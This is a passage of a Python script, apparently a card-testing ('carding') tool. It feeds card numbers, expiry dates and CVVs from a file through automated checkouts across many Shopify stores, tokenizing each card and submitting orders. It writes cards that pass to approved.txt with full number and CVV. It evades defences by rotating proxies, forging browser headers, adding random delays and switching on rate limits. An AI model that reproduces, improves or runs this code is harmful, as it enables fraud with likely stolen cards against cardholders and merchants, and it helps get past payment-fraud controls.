                    "INCORRECT_NUMBER", "PAYMENTS_CREDIT_CARD_NUMBER_INVALID_FORMAT", "FUNDING_ERROR", "PROCESSING_ERROR",
                    "PAYMENTS_CREDIT_CARD_BASE_EXPIRED"
                ]
                if any(tok in u for tok in fail_tokens):
                    return "❌"
                if ('"MISSING_TOTAL"' in u) or ('MISSING_TOTAL' in u):
                    return "❌ Checkout Failed"
                return "ℹ️ Result"

            prefix_fb = _status_prefix_fallback(code_display)

            pan_fb = str(card.get("number", "") or "")
            try:
                mm_fb = int(card.get("month", 0) or 0)
            except Exception:
                mm_fb = 0
            try:
                yy_fb = int(card.get("year", 0) or 0)
            except Exception:
                yy_fb = 0
            cvv_fb = str(card.get("verification_value", "") or "")
            mm_fb_str = f"{mm_fb:02d}"
            yy_fb_str = f"{yy_fb % 100:02d}"

            fallback = f"{prefix_fb} {pan_fb}|{mm_fb_str}|{yy_fb_str}|{cvv_fb}  |  {code_display}  |  {amount_display}"

            try:
                if isinstance(elapsed_seconds, (int, float)):
                    fallback = f"{fallback}  |   {elapsed_seconds:.1f}s"
            except Exception:
                pass
            try:
                if isinstance(site_display, str) and site_display.strip():
                    fallback = f"{fallback}   | site : {site_display.strip()}"
            except Exception:
                pass

            print(fallback, file=sys.__stdout__)

            try:
                if prefix_fb.startswith("💎"):
                    with open("approved.txt", "a", encoding="utf-8") as f:
                        f.write(fallback + "\n")
            except Exception:
                pass

        except Exception:
            pass

FAST_MODE = False
POLL_RECEIPT_MAX_ATTEMPTS = 10
SHORT_SLEEP = 3.0
MAX_WAIT_SECONDS = 8.0
HTTP_TIMEOUT_SHORT = 15
HTTP_TIMEOUT_MEDIUM = 20
STOP_AFTER_FIRST_RESULT = False
SINGLE_PROXY_ATTEMPT = True

PROXIES_FILE = (
    "working_proxies.txt" if os.path.exists("working_proxies.txt")
    else ("px.txt" if os.path.exists("px.txt") else None)
)
_proxies_list = []
_proxy_index = 0
_proxy_no_products_streak = {}
PROXY_NO_PRODUCTS_REMOVE_THRESHOLD = 4

def _normalize_proxy_url(p: str) -> str:
    try:
        s = (p or "").strip()
        if not s:
            return ""
        lower = s.lower()
        if lower.startswith(("http://", "https://", "socks5://", "socks5h://")):
            return s
        if "@" not in s and "://" not in s:
            parts = s.split(":")
            if len(parts) >= 4:
                host = parts[0]
                port = parts[1]
                user = ":".join(parts[2:-1]) if len(parts) > 4 else parts[2]
                pwd = parts[-1]
                try:
                    from urllib.parse import quote as _q
                except Exception:
                    _q = lambda x, safe="": x
                user_enc = _q(user, safe="")
                pwd_enc = _q(pwd, safe="")
                return f"http://{user_enc}:{pwd_enc}@{host}:{port}"
        return f"http://{s}"
    except Exception:
        return ""

def read_proxies_file(filename: str) -> list:
    items = []
    try:
        with open(filename, "r", encoding="utf-8") as f:
            for ln in f:
                ln = ln.strip()
                if ln and not ln.startswith("#"):
                    n = _normalize_proxy_url(ln)
                    if n:
                        items.append(n)
    except FileNotFoundError:
        return []
    except Exception:
        return items
    return items

def init_proxies():
    global _proxies_list, _proxy_index
    _proxies_list = read_proxies_file(PROXIES_FILE) if PROXIES_FILE else []
    _proxy_index = 0

def get_next_proxy_mapping():
    global _proxies_list, _proxy_index
    if not _proxies_list:
        return None, None
    try:
        proxy_url = _proxies_list[_proxy_index]
        _proxy_index = (_proxy_index + 1) % len(_proxies_list)
        return {"http": proxy_url, "https": proxy_url}, proxy_url
    except Exception:
        return None, None

def reuse_same_proxy_next_attempt():
    try:
        global _proxy_index, _proxies_list
        if _proxies_list:
            _proxy_index = (_proxy_index - 1) % len(_proxies_list)
    except Exception:
        pass

def _remove_proxy_from_file(proxy_url: str):
    try:
        if not PROXIES_FILE:
            return
        with open(PROXIES_FILE, "r", encoding="utf-8") as f:
            lines = [ln.rstrip("\n") for ln in f]
        target = _normalize_proxy_url(proxy_url)
        with open(PROXIES_FILE, "w", encoding="utf-8") as f:
            for ln in lines:
                if _normalize_proxy_url(ln) != target:
                    f.write(ln + "\n")
    except Exception:
        pass

def _remove_proxy_from_pool(proxy_url: str):
    try:
        global _proxies_list
        target = _normalize_proxy_url(proxy_url)
        _proxies_list = [p for p in _proxies_list if _normalize_proxy_url(p) != target]
        _remove_proxy_from_file(proxy_url)
        print(f"[INFO] Removed proxy due to NO_PRODUCTS streak: {proxy_url}")
    except Exception as e:
        print(f"[WARNING] Failed to remove proxy: {e}")

def increment_no_products_for_proxy(proxy_url: str):
    try:
        if not proxy_url:
            return
        key = _normalize_proxy_url(proxy_url)
        count = _proxy_no_products_streak.get(key, 0) + 1
        _proxy_no_products_streak[key] = count
        print(f"[Proxy] NO_PRODUCTS streak {count}/{PROXY_NO_PRODUCTS_REMOVE_THRESHOLD} for {proxy_url}")
        if count >= PROXY_NO_PRODUCTS_REMOVE_THRESHOLD:
            print(f"[Proxy] Threshold reached for {proxy_url}. Not removing proxy (disabled).")
    except Exception as e:
        print(f"[WARNING] Proxy streak tracking error: {e}")

def remove_site_from_working_sites(site: str) -> bool:
    try:
        normalized_target = normalize_shop_url(site).rstrip("/")
        with SITE_FILE_LOCK:
            try:
                with open("working_sites.txt", "r", encoding="utf-8") as f:
                    lines = [ln.strip() for ln in f if ln.strip()]
            except FileNotFoundError:
                return False
            with open("working_sites.txt", "w", encoding="utf-8") as f:
                for ln in lines:
                    try:
                        if normalize_shop_url(ln).rstrip("/") != normalized_target:
                            f.write(ln + "\n")
                    except Exception:
                        f.write(ln + "\n")
        return True
    except Exception:
        return False

def main():
    global SHOP_URL, VARIANT_ID, CARD_DATA

    sites = read_sites_from_file("working_sites.txt")
    if not sites:
        print("\n❌ [ERROR] No sites found in working_sites.txt")
        return

    cards = read_cc_file("cc.txt")
    if not cards:
        print("\n❌ [ERROR] No CC entries found in cc.txt")
        return

    if SUMMARY_ONLY:
        try:
            sys.stdout = open(os.devnull, "w", encoding="utf-8", errors="ignore")
        except Exception:
            pass
    else:
        print("=" * 70)
        try:
            if _mute_stream and not SUMMARY_ONLY:
                _mute_stream.close()
        except Exception:
            pass
        print("Dynamic Shopify Checkout - Multi-CC Multi-Site")
        print("=" * 70)
        print(f"Total sites: {len(sites)} | Total CCs: {len(cards)}")

    previous_site = None

    site_product_cache = {}

    init_proxies()

    for idx, card in enumerate(cards, start=1):
        tried_sites = set()
        worked = False
        site_attempt = 0
        skip_cc_due_to_unknown = False
        stop_cc_due_to_terminal = False
        stop_cc_after_result = False

        while site_attempt < len(sites) and not worked:
            candidates = [s for s in sites if s not in tried_sites]
            if not candidates:
                break
            site = random.choice(candidates)
            tried_sites.add(site)
            site_attempt += 1

            previous_site = site
            SHOP_URL = normalize_shop_url(site)
            VARIANT_ID = None
            CARD_DATA = {**CARD_DATA, **card}
            site_label = format_site_label(SHOP_URL)

            masked = mask_pan(card.get("number", ""))
            print("=" * 70)
            print(f"Starting {ordinal(idx)} CC ({masked}) on {ordinal(site_attempt)} site: {SHOP_URL}")

            attempts = 0
            max_attempts = len(_proxies_list) if _proxies_list else 1
            if SUMMARY_ONLY or ('FAST_MODE' in globals() and FAST_MODE):
                max_attempts = min(max_attempts, 3)
            try:
                if 'SINGLE_PROXY_ATTEMPT' in globals() and SINGLE_PROXY_ATTEMPT:
                    max_attempts = 1
            except Exception:
                pass
            site_skipped = False

            while attempts < max_attempts and not worked and not site_skipped:
                attempts += 1
                attempt_start_time = time.time()

                print(f"[INFO] {ordinal(idx)} CC, {ordinal(site_attempt)} site -> proxy attempt {attempts}/{max_attempts}")

                _original_stdout = sys.stdout
                try:
                    _mute_stream = open(os.devnull, "w", encoding="utf-8", errors="ignore")
                except Exception:
                    _mute_stream = None
                if _mute_stream and not SUMMARY_ONLY:
                    sys.stdout = _mute_stream

                proxies_mapping, used_proxy_url = get_next_proxy_mapping()
                session = create_session(SHOP_URL, proxies=proxies_mapping)

                cached = site_product_cache.get(SHOP_URL)
                if cached:
                    product_id, variant_id, price, title = cached
                else:
                    product_id, variant_id, price, title = auto_detect_cheapest_product(session, SHOP_URL)
                    if variant_id:
                        site_product_cache[SHOP_URL] = (product_id, variant_id, price, title)
                if not variant_id:
                    try:
                        if _mute_stream and not SUMMARY_ONLY:
                            sys.stdout = _original_stdout
                    except Exception:
                        pass
                    print("\n❌ [ERROR] Could not find any products on this site")
                    print(f"[INFO] Switching to next proxy (attempt {attempts}/{max_attempts})")
                    try:
                        if _mute_stream and not SUMMARY_ONLY:
                            _mute_stream.close()
                    except Exception:
                        pass
                    continue

                VARIANT_ID = variant_id
                print(f"\n✅ Using: {title}")

                checkout_token, session_token, cookies = step1_add_to_cart(session)
                if not checkout_token or not session_token:
                    try:
                        if _mute_stream and not SUMMARY_ONLY:
                            sys.stdout = _original_stdout
                    except Exception:
                        pass
                    print("\n[ERROR] Failed to create checkout")
                    print("[INFO] Proxy considered working (CHECKOUT_FAILED), switching to next proxy")
                    try:
                        if _mute_stream and not SUMMARY_ONLY:
                            _mute_stream.close()
                    except Exception:
                        pass
                    continue

                card_session_id = step2_tokenize_card(session, checkout_token)
                if not card_session_id:
                    try:
                        if _mute_stream and not SUMMARY_ONLY:
                            sys.stdout = _original_stdout
                    except Exception:
                        pass
                    print("\n[ERROR] Failed to tokenize card")
                    print("[INFO] Proxy considered working (TOKEN_FAILED), switching to next proxy")
                    try:
                        if _mute_stream and not SUMMARY_ONLY:
                            _mute_stream.close()
                    except Exception:
                        pass
                    continue

                queue_token, shipping_handle, merchandise_id, actual_total, delivery_expectations, phone_required = step3_proposal(
                    session, checkout_token, session_token, card_session_id
                )
                if not queue_token or not shipping_handle:
                    try:
                        if _mute_stream and not SUMMARY_ONLY:
                            sys.stdout = _original_stdout
                    except Exception:
                        pass
                    print("\n[ERROR] Failed to get proposal data")
                    print("[INFO] Proxy considered working (PROPOSAL_FAILED), switching to next proxy")
                    try:
                        if _mute_stream and not SUMMARY_ONLY:
                            _mute_stream.close()
                    except Exception:
                        pass
                    continue

                if not delivery_expectations or len(delivery_expectations) == 0:
                    delivery_expectations = []
                    if _mute_stream and not SUMMARY_ONLY:
                        sys.stdout = _original_stdout

                if _mute_stream and not SUMMARY_ONLY:
                    sys.stdout = _original_stdout

                receipt_result = step4_submit_completion(
                    session, checkout_token, session_token, queue_token,
                    shipping_handle, merchandise_id, card_session_id,
                    actual_total, delivery_expectations, phone_required
                )

                if isinstance(receipt_result, tuple):
                    if len(receipt_result) >= 4:
                        receipt_id, submit_code, submit_message, submit_resp = receipt_result
                    else:
                        receipt_id, submit_code, submit_message = receipt_result
                        submit_resp = {}
                else:
                    receipt_id = receipt_result
                    submit_code = "UNKNOWN"
                    submit_message = None
                    submit_resp = {}

                if not receipt_id:
                    try:
                        code_display = f'"code": "{str(submit_code)}"' if isinstance(submit_code, str) and submit_code else '"code": "UNKNOWN"'
                    except Exception:
                        code_display = '"code": "UNKNOWN"'
                    amount_display = format_amount(actual_total)
                    emit_summary_line(CARD_DATA, code_display, amount_display, time.time() - attempt_start_time, site_label)

                    try:
                        if isinstance(submit_code, str) and submit_code.upper() == "PAYMENTS_CREDIT_CARD_NUMBER_INVALID_FORMAT":
                            stop_cc_due_to_terminal = True
                            break
                    except Exception:
                        pass

                    try:
                        if is_unknown_code_display(code_display):
                            ts = int(time.time())
                            pan_last4 = re.sub(r"\D", "", CARD_DATA.get("number", "") or "")[-4:] or "xxxx"
                            site_token = re.sub(r"[^a-zA-Z0-9_-]+", "_", site_label or "site")
                            json_name = f"unknown_{site_token}_{pan_last4}_{ts}.json"
                            with open(json_name, "w", encoding="utf-8") as f:
                                json.dump(submit_resp if submit_resp else {"_source": "submit", "_code": str(submit_code)}, f, indent=2)
                    except Exception:
                        pass

                    try:
                        if STOP_AFTER_FIRST_RESULT:
                            stop_cc_after_result = True
                            break
                    except Exception:
                        pass

                    try:
                        if is_terminal_failure_code_display(code_display):
                            stop_cc_due_to_terminal = True
                            break
                    except Exception:
                        pass

                    try:
                        if STOP_AFTER_FIRST_RESULT:
                            stop_cc_after_result = True
                            break
                    except Exception:
                        pass

                    site_level_errors = {"MISSING_TOTAL", "CAPTCHA_METADATA_MISSING", "BUYER_IDENTITY_CURRENCY_NOT_SUPPORTED_BY_SHOP"}
                    if isinstance(submit_code, str) and submit_code.upper() in site_level_errors:
                        try:
                            remove_site_from_working_sites(SHOP_URL)
                        except Exception:
                            pass
                        try:
                            normalized_target = normalize_shop_url(SHOP_URL).rstrip("/")
                            sites = [s for s in sites if normalize_shop_url(s).rstrip("/") != normalized_target]
                        except Exception:
                            pass
                        site_skipped = True
                        break
                    else:
                        try:
                            if isinstance(submit_code, str) and submit_code.upper() == "GENERIC_ERROR":
                                worked = True
                                break
                        except Exception:
                            pass
                        try:
                            if (isinstance(submit_code, str) and submit_code.upper() == "PAYMENTS_CREDIT_CARD_BASE_EXPIRED") or ('"PAYMENTS_CREDIT_CARD_BASE_EXPIRED"' in str(code_display).upper()):
                                skip_cc_due_to_unknown = True
                                break
                        except Exception:
                            pass
                        try:
                            if is_unknown_code_display(code_display):
                                skip_cc_due_to_unknown = True
                                break
                        except Exception:
                            pass
                        continue

                success, poll_response, poll_log = step5_poll_receipt(session, checkout_token, session_token, receipt_id, capture_log=True)

                try:
                    code_display = extract_receipt_code(poll_response)
                except Exception:
                    code_display = '"code": "UNKNOWN"'
                amount_display = format_amount(actual_total)
                emit_summary_line(CARD_DATA, code_display, amount_display, time.time() - attempt_start_time, site_label)
                if success:
                    worked = True
                    try:
                        if STOP_AFTER_FIRST_RESULT:
                            stop_cc_after_result = True
                            break
                    except Exception:
                        pass
                else:
                    try:
                        if is_unknown_code_display(code_display):
                            ts = int(time.time())
                            pan_last4 = re.sub(r"\D", "", CARD_DATA.get("number", "") or "")[-4:] or "xxxx"
                            site_token = re.sub(r"[^a-zA-Z0-9_-]+", "_", site_label or "site")
                            json_name = f"unknown_{site_token}_{pan_last4}_{ts}.json"
                            with open(json_name, "w", encoding="utf-8") as f:
                                json.dump(poll_response, f, indent=2)
                            if isinstance(poll_log, str) and poll_log.strip():
                                log_name = f"unknown_{site_token}_{pan_last4}_{ts}.log"
                                with open(log_name, "w", encoding="utf-8") as f:
                                    f.write(poll_log)
                            skip_cc_due_to_unknown = True
                            break
                    except Exception:
                        pass

                    try:
                        if is_terminal_failure_code_display(code_display):
                            stop_cc_due_to_terminal = True
                            break
                    except Exception:
                        pass

                    try:
                        if STOP_AFTER_FIRST_RESULT:
                            stop_cc_after_result = True
                            break
                    except Exception:
                        pass

            if skip_cc_due_to_unknown or stop_cc_due_to_terminal or stop_cc_after_result:
                break


            if not worked and not site_skipped:
                print(f"[INFO] All proxies exhausted for {ordinal(idx)} CC on site {SHOP_URL}. Trying next site...")

        if not worked:
            print(f"[INFO] All sites exhausted for {ordinal(idx)} CC. Moving to next CC.")

import threading
from concurrent.futures import ThreadPoolExecutor

PARALLEL_THREADS = 5
PARALLEL_START_STAGGER_MIN_MS = 200
PARALLEL_START_STAGGER_MAX_MS = 500
SITE_REMOVAL_ENABLED = True

PROXY_LOCK = threading.Lock()
SITE_FILE_LOCK = threading.Lock()
PRODUCT_CACHE_LOCK = threading.Lock()

def get_next_proxy_mapping():
    global _proxies_list, _proxy_index
    with PROXY_LOCK:
        if not _proxies_list:
            return None, None
        try:
            proxy_url = _proxies_list[_proxy_index]
            _proxy_index = (_proxy_index + 1) % len(_proxies_list)
            return {"http": proxy_url, "https": proxy_url}, proxy_url
        except Exception:
            return None, None

def reuse_same_proxy_next_attempt():
    try:
        global _proxy_index, _proxies_list
        with PROXY_LOCK:
            if _proxies_list:
                _proxy_index = (_proxy_index - 1) % len(_proxies_list)
    except Exception:
        pass

def _remove_proxy_from_pool(proxy_url: str):
    try:
        global _proxies_list
        with PROXY_LOCK:
            target = _normalize_proxy_url(proxy_url)
            _proxies_list = [p for p in _proxies_list if _normalize_proxy_url(p) != target]
            _remove_proxy_from_file(proxy_url)
        print(f"[INFO] Removed proxy due to NO_PRODUCTS streak: {proxy_url}")
    except Exception as e:
        print(f"[WARNING] Failed to remove proxy: {e}")

def increment_no_products_for_proxy(proxy_url: str):
    try:
        if not proxy_url:
            return
        key = _normalize_proxy_url(proxy_url)
        with PROXY_LOCK:
            count = _proxy_no_products_streak.get(key, 0) + 1
            _proxy_no_products_streak[key] = count
        print(f"[Proxy] NO_PRODUCTS streak {count}/{PROXY_NO_PRODUCTS_REMOVE_THRESHOLD} for {proxy_url}")
        if count >= PROXY_NO_PRODUCTS_REMOVE_THRESHOLD:
            print(f"[Proxy] Threshold reached for {proxy_url}. Not removing proxy (disabled).")
    except Exception as e:
        print(f"[WARNING] Proxy streak tracking error: {e}")


def step1_add_to_cart_ctx(session, shop_url, variant_id, _429_retry_count=0):
    print("[1/5] Adding to cart and creating checkout...")
    add_url = f"{shop_url}/cart/add.js"
    payload = {"id": variant_id, "quantity": 1}
    try:
        if _429_retry_count > 0:
            delay = 5.0 + (_429_retry_count * 3.0)
            jitter = random.uniform(0.5, 2.0)
            time.sleep(delay + jitter)
        else:
            time.sleep(random.uniform(1.0, 2.5))
            
        r = session.post(add_url, json=payload, timeout=HTTP_TIMEOUT_SHORT, verify=False)
        print(f"  Add to cart: {r.status_code}")
        
        if r.status_code == 429 and _429_retry_count < 3:
            print(f"  Rate limited (attempt {_429_retry_count + 1}), signaling for proxy rotation")
            return "429_ROTATE", str(_429_retry_count), None
            
    except requests.exceptions.ProxyError as e:
        error_msg = str(e).lower()
        if "429" in error_msg or "too many requests" in error_msg:
            if _429_retry_count < 3:
                return "429_ROTATE", str(_429_retry_count), None
            else:
                return None, None, None
        raise
    except requests.exceptions.RequestException as e:
        error_msg = str(e).lower()
        if "429" in error_msg or "too many requests" in error_msg:
            if _429_retry_count < 1:
                return "429_ROTATE", str(_429_retry_count), None
            else:
                return None, None, None
        raise
    except Exception as e:
        error_msg = str(e).lower()
        if "429" in error_msg or "too many requests" in error_msg:
            if _429_retry_count < 1:
                return "429_ROTATE", str(_429_retry_count), None
            else:
                return None, None, None
        print(f"  [DEBUG] Add to cart request failed (non-critical): {type(e).__name__}")
        raise
    time.sleep(random.uniform(0.8, 1.5))
    
    checkout_url = f"{shop_url}/checkout"
    try:
        r = session.get(checkout_url, allow_redirects=True, timeout=HTTP_TIMEOUT_SHORT, verify=False)
    except requests.exceptions.ProxyError as e:
        error_msg = str(e).lower()
        if "429" in error_msg or "too many requests" in error_msg:
            if _429_retry_count < 1:
                return "429_ROTATE", str(_429_retry_count), None
            else:
                return None, None, None
        raise
    except requests.exceptions.RequestException as e:
        error_msg = str(e).lower()
        if "429" in error_msg or "too many requests" in error_msg:
            if _429_retry_count < 1:
                return "429_ROTATE", str(_429_retry_count), None
            else:
                return None, None, None
        raise
    except Exception as e:
        error_msg = str(e).lower()
        if "429" in error_msg or "too many requests" in error_msg:
            if _429_retry_count < 1:
                return "429_ROTATE", str(_429_retry_count), None
            else:
                return None, None, None
        print(f"  [DEBUG] Checkout init request failed (non-critical): {type(e).__name__}")
        raise
    final_url = r.url
    if '/checkouts/cn/' in final_url:
        checkout_token = final_url.split('/checkouts/cn/')[1].split('/')[0]
        print(f"  [OK] Checkout token: {checkout_token}")
        session_token = extract_session_token(r.text)
        return checkout_token, session_token, r.cookies
    return None, None, None

def step2_tokenize_card_ctx(session, checkout_token, shop_url, card_data):
    print("[2/5] Tokenizing credit card...")
    
    time.sleep(random.uniform(1.2, 2.0))

    try:
        scope_host = urlparse(shop_url).netloc or shop_url.replace('https://', '').replace('http://', '').split('/')[0]
    except Exception:
        scope_host = shop_url.replace('https://', '').replace('http://', '').split('/')[0]

    payload = {
        "credit_card": {
            "number": card_data["number"],
            "month": card_data["month"],
            "year": card_data["year"],
            "verification_value": card_data["verification_value"],
            "start_month": None,
            "start_year": None,
            "issue_number": "",
            "name": card_data["name"]
        },
        "payment_session_scope": scope_host
    }

    endpoints = [
        ("https://checkout.pci.shopifyinc.com/sessions", "https://checkout.pci.shopifyinc.com", "https://checkout.pci.shopifyinc.com/"),
    ]

    last_status = None
    last_text_head = None

    for ep_url, origin, referer in endpoints:
        headers = {
            "Origin": origin,
            "Referer": referer,
            "Content-Type": "application/json",
            "Accept": "application/json",
            "Accept-Language": "en-US,en;q=0.9",
            "Accept-Encoding": "gzip, deflate, br",
            "Sec-Fetch-Site": "cross-site",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Dest": "empty",
            "Sec-CH-UA": '"Chromium";v="129", "Google Chrome";v="129", "Not=A?Brand";v="99"',
            "Sec-CH-UA-Mobile": "?0",
            "Sec-CH-UA-Platform": '"Windows"',
            "DNT": "1",
            "Connection": "keep-alive",
            "User-Agent": session.headers.get("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36"),
        }

        try:
            r = session.post(ep_url, json=payload, headers=headers, timeout=HTTP_TIMEOUT_SHORT, verify=False)
        except Exception as e:
            print(f"  [TOKEN] Request exception at {urlparse(ep_url).netloc}: {e}")
            continue

        last_status = r.status_code
        try:
            last_text_head = r.text[:300]
        except Exception:
            last_text_head = None

        if r.status_code == 403:
            print(f"  [TOKEN] 403 Forbidden - Proxy/IP blocked by payment gateway")
            print(f"  [TOKEN] This is a proxy issue, not a site issue")
            continue

        if r.status_code == 200:
            try:
                token_data = r.json()
            except Exception:
                print(f"  [TOKEN] Invalid JSON from {urlparse(ep_url).netloc}")
                continue

            card_session_id = token_data.get("id")
            if card_session_id:
                print(f"  [OK] Card session ID: {card_session_id} via {urlparse(ep_url).netloc}")
                return card_session_id
            else:
                errs = token_data.get("errors") or token_data.get("error")
                if errs:
                    try:
                        print(f"  [TOKEN] {urlparse(ep_url).netloc} errors: {errs}")
                    except Exception:
                        pass
                continue
        else:
            print(f"  [TOKEN] {urlparse(ep_url).netloc} HTTP {r.status_code}")
            continue

    if last_status == 403:
        print(f"  [ERROR] Tokenization blocked: 403 Forbidden")
        print(f"  [PROXY ISSUE] Payment gateway blocked your IP/proxy")
        print(f"  [SOLUTION] Try: 1) Different proxy, 2) Residential proxy, 3) Wait cooldown")
    elif last_status == 429:
        print(f"  [ERROR] Tokenization rate limited: 429 Too Many Requests")
        print(f"  [SOLUTION] Rotate proxy or wait before retry")
    else:
        print(f"  [ERROR] Tokenization failed across endpoints. last_status={last_status} head={last_text_head}")
    
    return None

def poll_for_delivery_and_expectations_ctx(session, checkout_token, session_token, merchandise_stable_id, shop_url, variant_id, max_attempts=7):
    print(f"  [POLL] Waiting for delivery terms and expectations...")
    shop_url = normalize_shop_url(shop_url or "")
    url = f"{shop_url}/checkouts/unstable/graphql?operationName=Proposal"
    headers = {
        'shopify-checkout-client': 'checkout-web/1.0',
        'shopify-checkout-source': f'id="{checkout_token}", type="cn"',
        'x-checkout-web-source-id': checkout_token,
        'x-checkout-one-session-token': session_token,
    }
    query = """query Proposal($delivery:DeliveryTermsInput,$discounts:DiscountTermsInput,$payment:PaymentTermInput,$merchandise:MerchandiseTermInput,$buyerIdentity:BuyerIdentityTermInput,$taxes:TaxTermInput,$sessionInput:SessionTokenInput!,$tip:TipTermInput,$note:NoteInput,$scriptFingerprint:ScriptFingerprintInput,$optionalDuties:OptionalDutiesInput,$cartMetafields:[CartMetafieldOperationInput!],$memberships:MembershipsInput){session(sessionInput:$sessionInput){negotiate(input:{purchaseProposal:{delivery:$delivery,discounts:$discounts,payment:$payment,merchandise:$merchandise,buyerIdentity:$buyerIdentity,taxes:$taxes,tip:$tip,note:$note,scriptFingerprint:$scriptFingerprint,optionalDuties:$optionalDuties,cartMetafields:$cartMetafields,memberships:$memberships}}){__typename result{...on NegotiationResultAvailable{queueToken sellerProposal{deliveryExpectations{...on FilledDeliveryExpectationTerms{deliveryExpectations{signedHandle __typename}__typename}...on PendingTerms{pollDelay __typename}__typename}delivery{...on FilledDeliveryTerms{deliveryLines{availableDeliveryStrategies{...on CompleteDeliveryStrategy{handle phoneRequired amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}__typename}checkoutTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}}}}"""
    delivery_line = {
        "destination": {
            "partialStreetAddress": {
                "address1": CHECKOUT_DATA["address1"],
                "city": CHECKOUT_DATA["city"],
                "countryCode": CHECKOUT_DATA["country"],
                "firstName": CHECKOUT_DATA["first_name"],
                "lastName": CHECKOUT_DATA["last_name"],
                "zoneCode": CHECKOUT_DATA["province"],
                "postalCode": CHECKOUT_DATA["zip"],
                "phone": CHECKOUT_DATA["phone"],
                "oneTimeUse": False
            }
        },
        "targetMerchandiseLines": {"lines": [{"stableId": merchandise_stable_id}]},
        "deliveryMethodTypes": ["SHIPPING"],
        "destinationChanged": False,
        "selectedDeliveryStrategy": {
            "deliveryStrategyByHandle": {
                "handle": "any",
                "customDeliveryRate": False
            }
        },
        "expectedTotalPrice": {"any": True}
    }
    billing_address_data = {
        "address1": CHECKOUT_DATA["address1"],
        "city": CHECKOUT_DATA["city"],
        "countryCode": CHECKOUT_DATA["country"],
        "firstName": CHECKOUT_DATA["first_name"],
        "lastName": CHECKOUT_DATA["last_name"],
        "zoneCode": CHECKOUT_DATA["province"],
        "postalCode": CHECKOUT_DATA["zip"],
        "phone": CHECKOUT_DATA["phone"]
    }
    payload = {
        "operationName": "Proposal",
        "query": query,
        "variables": {
            "delivery": {
                "deliveryLines": [delivery_line],
                "noDeliveryRequired": [],
                "supportsSplitShipping": True
            },
            "discounts": {"lines": [], "acceptUnexpectedDiscounts": True},
            "payment": {
                "totalAmount": {"any": True},
                "paymentLines": [],
                "billingAddress": {"streetAddress": billing_address_data}
            },
            "merchandise": {
                "merchandiseLines": [{
                    "stableId": merchandise_stable_id,
                    "merchandise": {
                        "productVariantReference": {
                            "id": f"gid://shopify/ProductVariantMerchandise/{variant_id}",
                            "variantId": f"gid://shopify/ProductVariant/{variant_id}",
                            "properties": [],
                            "sellingPlanId": None
                        }
                    },
                    "quantity": {"items": {"value": 1}},
                    "expectedTotalPrice": {"any": True},
                    "lineComponents": []
                }]
            },
            "buyerIdentity": {
                "customer": {"presentmentCurrency": "USD", "countryCode": CHECKOUT_DATA["country"]},
                "email": CHECKOUT_DATA["email"]
            },
            "taxes": {"proposedTotalAmount": {"any": True}},
            "sessionInput": {"sessionToken": session_token},
            "tip": {"tipLines": []},
            "note": {"message": None, "customAttributes": []},
            "scriptFingerprint": {
                "signature": None,
                "signatureUuid": None,
                "lineItemScriptChanges": [],
                "paymentScriptChanges": [],
                "shippingScriptChanges": []
            },
            "optionalDuties": {"buyerRefusesDuties": False},
            "cartMetafields": [],
            "memberships": {"memberships": []}
        }
    }
    shipping_handle = None
    shipping_amount = None
    delivery_expectations = []
    queue_token = None
    for attempt in range(max_attempts):
        print(f"  Attempt {attempt + 1}/{max_attempts}...")
        r = session.post(url, json=payload, headers=headers, timeout=HTTP_TIMEOUT_SHORT, verify=False)
        if r.status_code != 200:
            print(f"  [ERROR] HTTP {r.status_code}")
            time.sleep(SHORT_SLEEP)
            continue
        try:
            response = r.json()
            if 'errors' in response:
                print(f"  [ERROR] GraphQL errors:")
                for error in response['errors']:
                    print(f"    - {error.get('message', 'Unknown')}")
                time.sleep(SHORT_SLEEP)
                continue
            result = response.get('data', {}).get('session', {}).get('negotiate', {}).get('result', {})
            if result.get('__typename') != 'NegotiationResultAvailable':
                time.sleep(SHORT_SLEEP)
                continue
            queue_token = result.get('queueToken')
            seller_proposal = result.get('sellerProposal', {})
            delivery_terms = seller_proposal.get('delivery', {})
            delivery_typename = delivery_terms.get('__typename')
            delivery_exp_terms = seller_proposal.get('deliveryExpectations', {})
            exp_typename = delivery_exp_terms.get('__typename')
            checkout_total = seller_proposal.get('checkoutTotal', {})
            actual_total = None
            if checkout_total.get('__typename') == 'MoneyValueConstraint':
                actual_total = checkout_total.get('value', {}).get('amount')
            print(f"  Status - Delivery: {delivery_typename}, Expectations: {exp_typename}")
            if delivery_typename == 'FilledDeliveryTerms':
                delivery_lines = delivery_terms.get('deliveryLines', [])
                if delivery_lines:
                    strategies = delivery_lines[0].get('availableDeliveryStrategies', [])
                    if strategies:
                        shipping_handle = strategies[0].get('handle')
                        amount_constraint = strategies[0].get('amount', {})
                        if amount_constraint.get('__typename') == 'MoneyValueConstraint':
                            shipping_amount = amount_constraint.get('value', {}).get('amount')
                        print(f"  ✓ Got shipping handle: {shipping_handle[:50] if shipping_handle else 'None'}...")
                        delivery_line["selectedDeliveryStrategy"] = {
                            "deliveryStrategyByHandle": {
                                "handle": shipping_handle,
                                "customDeliveryRate": False
                            },
                            "options": {"phone": CHECKOUT_DATA["phone"]}
                        }
                        if shipping_amount:
                            delivery_line["expectedTotalPrice"] = {
                                "value": {"amount": str(shipping_amount), "currencyCode": "USD"}
                            }
                        payload["variables"]["delivery"]["deliveryLines"][0] = delivery_line
            if exp_typename == 'FilledDeliveryExpectationTerms':
                expectations = delivery_exp_terms.get('deliveryExpectations', [])
                for exp in expectations:
                    signed_handle = exp.get('signedHandle')
                    if signed_handle:
                        delivery_expectations.append({"signedHandle": signed_handle})
                print(f"  ✓ Got {len(delivery_expectations)} delivery expectations")
            if shipping_handle and delivery_expectations and actual_total:
                print(f"  [POLL] ✓ Complete! Handle: {shipping_handle[:30]}..., Total: ${actual_total}")
                return queue_token, shipping_handle, shipping_amount, actual_total, delivery_expectations
            poll_delay = 500
            if delivery_typename == 'PendingTerms':
                poll_delay = delivery_terms.get('pollDelay', 500)
            elif exp_typename == 'PendingTerms':
                poll_delay = delivery_exp_terms.get('pollDelay', 500)
            wait_seconds = min(poll_delay / 1000.0, MAX_WAIT_SECONDS)
            time.sleep(wait_seconds)
        except Exception as e:
            print(f"  [ERROR] {e}")
